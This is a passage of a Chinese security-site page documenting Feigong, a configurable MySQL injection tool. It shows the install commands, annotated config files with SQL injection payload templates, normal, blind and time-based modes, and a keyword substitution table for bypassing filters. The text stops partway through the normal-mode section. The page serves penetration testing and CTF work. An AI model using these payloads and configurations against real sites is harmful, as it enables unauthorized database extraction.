<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>Feigong - 针对各种情况自由变化的 mysql 注入工具</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">Feigong - 针对各种情况自由变化的 mysql 注入工具</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2016-11-28" class="timeago">9 月，3 周 之前</time>
          <time datetime="2016-11-28" class="fulldate">十一月 28, 2016</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/tools/">安全工具&amp;安全开发</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>项目地址：https://github.com/LoRexxar/Feigong</p>
<p>作者：<a href="http://lorexxar.cn/">LoRexxar</a></p>
<h2>非攻</h2>
<p>取自《秦时明月》--非攻，针对不同情况自由变化的武器</p>
<p>Feigong，针对各种情况自由变化的mysql注入脚本</p>
<p>Feigong，In view of the different things freely change the mysql injection script</p>
<h2>什么是非攻？</h2>
<p>在sqlmap的使用过程中，常常碰到很普通的绕过过滤方式，例如空格--&gt;%0b、%0a，但是却没办法使用sqlmap来获取数据的情况，于是花了很长时间来完善脚本，让非攻可以通过修改config.py一个文件中的设置，让非攻在面对不同情况时成为了灵活多变的注入脚本...</p>
<p>非攻目前集成了对mysql的normal、build、time，3种注入方式...</p>
<h3>在使用非攻之前</h3>
<p>1、首先你需要找到一个注入点（在考虑写一个这样的工具）</p>
<p>2、判断数据库为mysql</p>
<p>3、通过巧妙地过滤可以获取数据</p>
<p>4、开始使用非攻</p>
<h2>使用文档</h2>
<div class="codehilite"><pre><span></span>Feigong
│  .gitignore
│  feigong.py
│  README.md
│
├─demo
│  ├─demo1
│  │      advanced_config.py
│  │      config.py
│  │
│  └─demo2
│          advanced_config.py
│          config.py
│
├─lib
│      Conpayload.py
│      data.py
│      dealpayload.py
│      log.py
│      unpack.py
│      __init__.py
│
├─log
│
└─sqlier
    │  advanced_config.py
    │  config.py
    │  __init__.py
    │
    ├─configuration
    │      buildconfig.py
    │      __init__.py
    │
    ├─default
    │      advanced_config_default.py
    │      config_default.py
    │      __init__.py
    │
    ├─tamper
    │      expand.py
    │      __init__.py
    │
    └─techniques
            columns.py
            content.py
            database.py
            tables.py
            test.py
            __init__.py
</pre></div>


<p>Feigong一切一切的核心在于sqlier/config.py和sqlier/advanced_config.py,代码层的自定义可以面对任何情况</p>
<h3>安装</h3>
<p>你可以通过点击下载，或者git clone来获取源码</p>
<div class="codehilite"><pre><span></span>git clone https://github.com/LoRexxar/Feigong.git
</pre></div>


<h3>使用</h3>
<p>首先你需要安装依赖</p>
<div class="codehilite"><pre><span></span>pip install -r requirements.txt
</pre></div>


<p>打开对应Feigong的目录，跑一下默认demo看看结果</p>
<div class="codehilite"><pre><span></span>python feigong.py
</pre></div>


<h3>开始</h3>
<p>Feigong是通过修改sqlier/config.py &amp; sqlier/advanced_config.py来实现注入的，config.py是feigong的基础配置，advanced_config.py是进阶配置，而default中是默认的配置文件，以免默认修改过后找不到正确的配置。</p>
<p>config.py是基础配置，只有基础配置完成的情况下才能进行正常的配置。</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">BaseConfig</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        基类初始化，整个注入工具的核心配置</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="c1"># 目标url</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://demo.lorexxar.pw/get.php&#39;</span>

        <span class="c1"># 请求头参数</span>
        <span class="c1"># cookies = {&quot;username&quot;:data,&quot;path&quot;:&quot;/admin/&quot;,&quot;domain&quot;:&quot;451bf8ea3268360ee.jie.sangebaimao.com&quot;}</span>
        <span class="c1"># self.headers = {&quot;Cookie&quot;: &quot;username=&quot; + data + &quot;; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=&quot; + data}</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="c1"># 传参方式 0为GET 1为POST</span>
        <span class="n">SqliRequest</span> <span class="o">=</span> <span class="p">(</span>
            <span class="s2">&quot;GET&quot;</span><span class="p">,</span>
            <span class="s2">&quot;POST&quot;</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sqlirequest</span> <span class="o">=</span> <span class="n">SqliRequest</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

        <span class="c1"># 注入方式 0为正常 1为盲注 2为时间盲注</span>
        <span class="n">SqliMethod</span> <span class="o">=</span> <span class="p">(</span>
            <span class="s2">&quot;normal&quot;</span><span class="p">,</span>
            <span class="s2">&quot;build&quot;</span><span class="p">,</span>
            <span class="s2">&quot;time&quot;</span>
        <span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sqlimethod</span> <span class="o">=</span> <span class="n">SqliMethod</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        从这里开始，要进入对于payload的配置了，首先需要对注入语句进行配置，然后注入语句通过自定义的替换表，之后构造注入语句为请求</span>
<span class="sd">        payload===&gt;替换为指定payload===&gt;自定义替换表===&gt;请求===&gt;开始注入</span>

<span class="sd">        若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））</span>
<span class="sd">        eg: self.payload = &quot;padding&#39; union all select 1,&#39;Feigong&#39; #&quot;</span>

<span class="sd">        若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件</span>
<span class="sd">        eg: self.payload = &quot;padding&#39; &amp;&amp; 2333 #&quot;</span>

<span class="sd">        若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者&#39;Feigong&#39;填充</span>
<span class="sd">        eg: self.payload = &quot;padding&#39; union all select 1,&#39;Feigong&#39; #&quot;</span>
<span class="sd">        eg: self.payload = &quot;padding&#39; &amp;&amp; 2333 #&quot;</span>

<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;padding&#39; &amp;&amp; 2333 #&quot;</span>

        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        配置请求,把请求中payload的位置设置为Feigong（如果拼错了就会全部无效...）</span>
<span class="sd">        self.requesetformat = &quot;user=Feigong&amp;passwd=ddog123&amp;submit=Log+In&quot;</span>
<span class="sd">        self.requesetformat = {&quot;user&quot;: &quot;Feigong&quot;, &quot;password&quot;: &quot;a&quot;}</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">requesetformat</span> <span class="o">=</span> <span class="s2">&quot;user=Feigong&amp;passwd=ddog123&amp;submit=Log+In&quot;</span>
        <span class="c1"># self.requesetformat = {&quot;user&quot;: &quot;Feigong&quot;, &quot;password&quot;: &quot;a&quot;}</span>

        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        在注入之前，你首先需要测试，test.py中包含所有的测试函数，包括test、get_now_database、get_version、get_user</span>

<span class="sd">        self.wtest是是否进入测试模式、测试模式优先级最高和普通模式不兼容，默认开启</span>

<span class="sd">        而testmethod则是选择使用那种测试，互相兼容可以同时跑</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wtest</span> <span class="o">=</span> <span class="bp">False</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">testmethod</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&quot;test&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
            <span class="s2">&quot;database&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s2">&quot;version&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="mi">1</span>
        <span class="p">}</span>
        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        正式注入模式的选择，test模式开启时，无论正式注入模式是否开启都无效，默认开启</span>

<span class="sd">        all为全部注入，将自动从database注入直到数据前10条</span>
<span class="sd">        content为注入数据，可以预设columns、tables和database</span>
<span class="sd">        columns为注入列名，可以预设tables和database</span>
<span class="sd">        tables为注入表名，可以预设database</span>
<span class="sd">        database为注入表名</span>
<span class="sd">        统一规则为如果不预设，则自动调用上一层的类获取数据</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wsqli</span> <span class="o">=</span> <span class="bp">True</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">sqlilocation</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s2">&quot;columns&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s2">&quot;tables&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
            <span class="s2">&quot;database&quot;</span><span class="p">:</span> <span class="mi">1</span>
        <span class="p">}</span>
</pre></div>


<p>advanced_config.py是进阶配置，进阶配置可以配置一些特殊的请况</p>
<div class="codehilite"><pre><span></span><span class="kr">class</span> <span class="nx">AdvanceConfig</span><span class="p">(</span><span class="nx">BaseConfig</span><span class="p">)</span><span class="o">:</span>
    <span class="nx">def</span> <span class="nx">__init__</span><span class="p">(</span><span class="nx">self</span><span class="p">)</span><span class="o">:</span>
        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        进阶配置，如果对代码不够熟悉，建议不修改这部分配置</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="nx">BaseConfig</span><span class="p">.</span><span class="nx">__init__</span><span class="p">(</span><span class="nx">self</span><span class="p">)</span>
        <span class="err">#</span> <span class="err">版本号</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">version</span> <span class="o">=</span> <span class="s2">&quot;V1.2.0&quot;</span>

        <span class="err">#</span> <span class="err">初始化</span><span class="nx">request</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">s</span> <span class="o">=</span> <span class="nx">requests</span><span class="p">.</span><span class="nx">Session</span><span class="p">()</span>

        <span class="err">#</span> <span class="nx">log日志级别</span><span class="err">，</span><span class="nx">debug为显示大部分信息</span><span class="err">，</span><span class="nx">info为注入结果的显示</span>
        <span class="nx">LogLevel</span> <span class="o">=</span> <span class="p">(</span>
            <span class="nx">logging</span><span class="p">.</span><span class="nx">DEBUG</span><span class="p">,</span>
            <span class="nx">logging</span><span class="p">.</span><span class="nx">INFO</span><span class="p">,</span>
            <span class="nx">logging</span><span class="p">.</span><span class="nx">WARN</span>
        <span class="p">)</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">loglevel</span> <span class="o">=</span> <span class="nx">LogLevel</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        若注入方式为build盲注，则通过返回长度判断</span>
<span class="s2">        永真条件的长度（盲注时需要使用），默认为0，可设置, 如果不设置会默认使用self.payload获取的返回长度为self.len</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">len</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        若注入方式为time，你需要设置延时，建议根据自己的网络环境选择，如果网络环境较差，建议还是大一点儿</span>
<span class="s2">        建议2-5，现在版本还是单线程，所以时间盲注会比较慢...</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">time</span> <span class="o">=</span> <span class="mi">3</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        database可以自定义，默认为空，若为空会调用get_database(),这里是一个列表，必须按照列表格式</span>
<span class="s2">        self.databases_name = [&#39;test&#39;, &#39;test2&#39;]（当然，如果database_name错误...则不会注到数据）</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="err">#</span> <span class="nx">self</span><span class="p">.</span><span class="nx">databases_name</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;hctfsqli1&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">]</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">databases_name</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        然后是table name，tables_name的格式为字典+元组</span>
<span class="s2">        self.tables_name = {&#39;hctfsqli1&#39;: (&#39;test1&#39;, &#39;test2&#39;), &#39;test&#39;,(&#39;test1&#39;, &#39;test2&#39;)}(如果有写错某些值，则会注不到数据)</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="err">#</span> <span class="nx">self</span><span class="p">.</span><span class="nx">tables_name</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;test&#39;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,),</span> <span class="s1">&#39;hctfsqli1&#39;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;hhhhctf&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span> <span class="s1">&#39;users&#39;</span><span class="p">)}</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">tables_name</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        然后是self.columns_name，columns_name的格式为字典套字典+元组</span>
<span class="s2">        self.columns_name = {&#39;test&#39;: {&#39;test&#39;: (&#39;test&#39;, &#39;test1&#39;, &#39;test2&#39;)}, &#39;test2&#39;: {&#39;test&#39;: (&#39;test&#39;, &#39;test1&#39;, &#39;test2&#39;)}}</span>
<span class="s2">        (同样，如果有写错的值，则会注入不到数据)</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="err">#</span> <span class="nx">self</span><span class="p">.</span><span class="nx">columns_name</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;test&#39;</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;test&#39;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">,)},</span> <span class="s1">&#39;hctfsqli1&#39;</span><span class="o">:</span> <span class="p">{</span><span class="s1">&#39;test&#39;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;test1&#39;</span><span class="p">,</span> <span class="s1">&#39;testtest&#39;</span><span class="p">,</span> <span class="s1">&#39;flag1&#39;</span><span class="p">),</span> <span class="s1">&#39;users&#39;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">),</span> <span class="s1">&#39;hhhhctf&#39;</span><span class="o">:</span> <span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,)}}</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">columns_name</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        当选择注入content时，你需要指定输入数据的上限，默认为10</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">content_count</span> <span class="o">=</span> <span class="mi">10</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload</span>
<span class="s2">        &quot;&quot;&quot;</span>

        <span class="nx">self</span><span class="p">.</span><span class="nx">filter</span> <span class="o">=</span> <span class="p">{</span>
            <span class="err">#</span> <span class="nx">padding</span> <span class="err">为填充字段，</span><span class="nx">build与注入要求padding必须为真值</span>
            <span class="s1">&#39;padding&#39;</span><span class="o">:</span> <span class="s1">&#39;user1&#39;</span><span class="p">,</span>
            <span class="err">#</span> <span class="err">符号替换（</span><span class="nx">url</span> <span class="nx">encode是get默认自带的</span><span class="err">，不需要修改）</span>
            <span class="s1">&#39;\&#39;&#39;</span><span class="o">:</span> <span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span>
            <span class="s1">&#39;\&quot;&#39;</span><span class="o">:</span> <span class="s1">&#39;\&quot;&#39;</span><span class="p">,</span>
            <span class="s1">&#39;&amp;&#39;</span><span class="o">:</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span>
            <span class="s1">&#39;|&#39;</span><span class="o">:</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span>
            <span class="s1">&#39;&gt;&#39;</span><span class="o">:</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span>
            <span class="s1">&#39;&lt;&#39;</span><span class="o">:</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span>
            <span class="s1">&#39;=&#39;</span><span class="o">:</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span>
            <span class="s1">&#39;.&#39;</span><span class="o">:</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span>
            <span class="err">#</span> <span class="err">注入语句关键字替换</span>
            <span class="s1">&#39;union&#39;</span><span class="o">:</span> <span class="s1">&#39;union&#39;</span><span class="p">,</span>
            <span class="s1">&#39;select&#39;</span><span class="o">:</span> <span class="s1">&#39;SELECT&#39;</span><span class="p">,</span>
            <span class="s1">&#39;insert&#39;</span><span class="o">:</span> <span class="s1">&#39;insert&#39;</span><span class="p">,</span>
            <span class="s1">&#39;update&#39;</span><span class="o">:</span> <span class="s1">&#39;update&#39;</span><span class="p">,</span>
            <span class="s1">&#39;delete&#39;</span><span class="o">:</span> <span class="s1">&#39;delete&#39;</span><span class="p">,</span>
            <span class="s1">&#39;limit&#39;</span><span class="o">:</span> <span class="s1">&#39;limit&#39;</span><span class="p">,</span>
            <span class="s1">&#39;where&#39;</span><span class="o">:</span> <span class="s1">&#39;where&#39;</span><span class="p">,</span>
            <span class="err">#</span> <span class="err">注入函数</span>
            <span class="s1">&#39;user&#39;</span><span class="o">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span>
            <span class="s1">&#39;database&#39;</span><span class="o">:</span> <span class="s1">&#39;database&#39;</span><span class="p">,</span>
            <span class="s1">&#39;version&#39;</span><span class="o">:</span> <span class="s1">&#39;version&#39;</span><span class="p">,</span>
            <span class="s1">&#39;if&#39;</span><span class="o">:</span> <span class="s1">&#39;if&#39;</span><span class="p">,</span>
            <span class="s1">&#39;ifnull&#39;</span><span class="o">:</span> <span class="s1">&#39;ifnull&#39;</span><span class="p">,</span>
            <span class="s1">&#39;concat&#39;</span><span class="o">:</span> <span class="s1">&#39;concat&#39;</span><span class="p">,</span>
            <span class="s1">&#39;ascii&#39;</span><span class="o">:</span> <span class="s1">&#39;ascii&#39;</span><span class="p">,</span>  <span class="err">#</span> <span class="nx">hex</span><span class="p">()</span><span class="err">、</span><span class="nx">bin</span><span class="p">()</span>
            <span class="s1">&#39;count&#39;</span><span class="o">:</span> <span class="s1">&#39;count&#39;</span><span class="p">,</span>
            <span class="s1">&#39;substring&#39;</span><span class="o">:</span> <span class="s1">&#39;substring&#39;</span><span class="p">,</span>  <span class="err">#</span> <span class="nx">mid</span><span class="p">()</span><span class="err">、</span><span class="nx">substr</span><span class="p">()</span>
            <span class="s1">&#39;length&#39;</span><span class="o">:</span> <span class="s1">&#39;length&#39;</span><span class="p">,</span>
            <span class="s2">&quot;sleep(&quot;</span> <span class="o">+</span> <span class="nx">repr</span><span class="p">(</span><span class="nx">self</span><span class="p">.</span><span class="nx">time</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="o">:</span> <span class="s2">&quot;sleep(&quot;</span> <span class="o">+</span> <span class="nx">repr</span><span class="p">(</span><span class="nx">self</span><span class="p">.</span><span class="nx">time</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="p">,</span>  <span class="err">#</span> <span class="nx">benchmark</span><span class="p">()</span>
            <span class="err">#</span> <span class="err">库名表名关键字</span>
            <span class="s1">&#39;information_schema&#39;</span><span class="o">:</span> <span class="s1">&#39;information_schema&#39;</span><span class="p">,</span>
            <span class="s1">&#39;schemata&#39;</span><span class="o">:</span> <span class="s1">&#39;schemata&#39;</span><span class="p">,</span>
            <span class="s1">&#39;schema_name&#39;</span><span class="o">:</span> <span class="s1">&#39;schema_name&#39;</span><span class="p">,</span>
            <span class="s1">&#39;tables&#39;</span><span class="o">:</span> <span class="s1">&#39;tables&#39;</span><span class="p">,</span>
            <span class="s1">&#39;table_name&#39;</span><span class="o">:</span> <span class="s1">&#39;table_name&#39;</span><span class="p">,</span>
            <span class="s1">&#39;columns&#39;</span><span class="o">:</span> <span class="s1">&#39;columns&#39;</span><span class="p">,</span>
            <span class="s1">&#39;column_name&#39;</span><span class="o">:</span> <span class="s1">&#39;column_name&#39;</span><span class="p">,</span>
            <span class="err">#</span> <span class="err">然后是特殊的字符</span>
            <span class="s1">&#39; &#39;</span><span class="o">:</span> <span class="s1">&#39; &#39;</span><span class="p">,</span>  <span class="err">#</span> <span class="err">由于过滤后自动进行</span><span class="nx">url</span> <span class="nx">encode</span><span class="err">，所以替换表不能使用</span><span class="nx">url</span> <span class="nx">encode过的字符</span><span class="err">，</span><span class="nx">eg</span><span class="o">:%</span><span class="mi">0</span><span class="nx">a</span><span class="o">-&gt;</span><span class="err">\</span><span class="nx">n</span> <span class="o">%</span><span class="mi">0</span><span class="nx">b</span><span class="o">-&gt;</span><span class="err">\</span><span class="nx">x0b</span>
            <span class="s1">&#39;#&#39;</span><span class="o">:</span> <span class="s1">&#39;#&#39;</span>  <span class="err">#</span> <span class="o">--+</span>
        <span class="p">}</span>

        <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        初始化dealpayload类，传入self.sqlimethod，self.payload, self.requestformat, self.filter</span>
<span class="s2">        &quot;&quot;&quot;</span>
        <span class="nx">self</span><span class="p">.</span><span class="nx">dealpayload</span> <span class="o">=</span> <span class="nx">ConPayload</span><span class="p">(</span><span class="nx">self</span><span class="p">.</span><span class="nx">sqlirequest</span><span class="p">,</span> <span class="nx">self</span><span class="p">.</span><span class="nx">payload</span><span class="p">,</span> <span class="nx">self</span><span class="p">.</span><span class="nx">requesetformat</span><span class="p">,</span> <span class="nx">self</span><span class="p">.</span><span class="nx">filter</span><span class="p">,</span> <span class="nx">self</span><span class="p">.</span><span class="nx">time</span><span class="p">)</span>
</pre></div>


<p>Feigong现在的版本还仅仅支持对于mysql的3种注入方式：
- 普通注入（normal）：也就是会有返回的注入点
- 盲注（build）：没有返回，但可以通过真假条件来判断执行结果
- 时间盲注（time）：没有返回，但是可以通过返回请求的间隔时间来判断真假</p>
<h4>基础配置</h4>
<p>首先你需要进行基础的配置，首先是基础的目标url，请求头，传参方式，注入方式等...</p>
<div class="codehilite"><pre><span></span><span class="c1"># 目标url</span>
<span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://demo.lorexxar.pw/get.php&#39;</span>
<span class="bp">self</span><span class="o">.</span><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

<span class="c1"># 请求头参数</span>
<span class="c1"># cookies = {&quot;username&quot;:data,&quot;path&quot;:&quot;/admin/&quot;,&quot;domain&quot;:&quot;451bf8ea3268360ee.jie.sangebaimao.com&quot;}</span>
<span class="c1"># self.headers = {&quot;Cookie&quot;: &quot;username=&quot; + data + &quot;; captcha=od8lgg6f7i71q16j9rd7p7j9a2; username=&quot; + data}</span>
<span class="bp">self</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span>

<span class="c1"># 传参方式 0为GET 1为POST</span>
<span class="n">SqliRequest</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s2">&quot;GET&quot;</span><span class="p">,</span>
    <span class="s2">&quot;POST&quot;</span>
<span class="p">)</span>
<span class="bp">self</span><span class="o">.</span><span class="n">sqlirequest</span> <span class="o">=</span> <span class="n">SqliRequest</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

<span class="c1"># 注入方式 0为正常 1为盲注 2为时间盲注</span>
<span class="n">SqliMethod</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s2">&quot;normal&quot;</span><span class="p">,</span>
    <span class="s2">&quot;build&quot;</span><span class="p">,</span>
    <span class="s2">&quot;time&quot;</span>
<span class="p">)</span>
<span class="bp">self</span><span class="o">.</span><span class="n">sqlimethod</span> <span class="o">=</span> <span class="n">SqliMethod</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</pre></div>


<p>上面的每一步都给出了相应的参数，目标url中，不需要加上参数，关于参数的配置，我们会在后面进行...</p>
<p>ps:如果出现get和post请求都必须存在的情况，若注入点再post，可以直接把get请求代入到目标url中，如果反过来，则暂时不支持</p>
<h4>注入方式的配置</h4>
<p>根据这一段的选择，我们会在后面进行不同的配置选项</p>
<div class="codehilite"><pre><span></span><span class="n">SqliMethod</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s2">&quot;normal&quot;</span><span class="p">,</span>
    <span class="s2">&quot;build&quot;</span><span class="p">,</span>
    <span class="s2">&quot;time&quot;</span>
<span class="p">)</span>
<span class="bp">self</span><span class="o">.</span><span class="n">sqlimethod</span> <span class="o">=</span> <span class="n">SqliMethod</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</pre></div>


<h5>normal</h5>
<p>如果注入模式为normal，需要定义基础payload</p>
